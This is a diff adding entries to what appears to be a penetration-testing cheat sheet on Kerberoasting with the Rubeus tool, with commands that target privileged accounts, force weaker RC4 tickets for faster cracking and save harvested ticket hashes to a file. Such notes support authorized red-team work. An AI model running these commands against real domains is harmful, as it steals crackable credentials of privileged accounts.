@@ -1368,3 +1368,15 @@ Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
 Notes
 * admincount=1 indicates protected or privileged accounts.
 * Reduces noise and focuses on high-impact targets.
+
+### Rubeus — Request RC4 tickets (faster cracking)
+Purpose
+Force the use of RC4 encryption when possible.
+```powershell
+Rubeus.exe kerberoast /tgtdeleg /nowrap
+```
+### Rubeus — Save tickets to a file
+by adding /outfile:<filename> tag, ex.
+```powershell
+Rubeus.exe kerberoast /nowrap /outfile:tgs_hashes.txt
+```
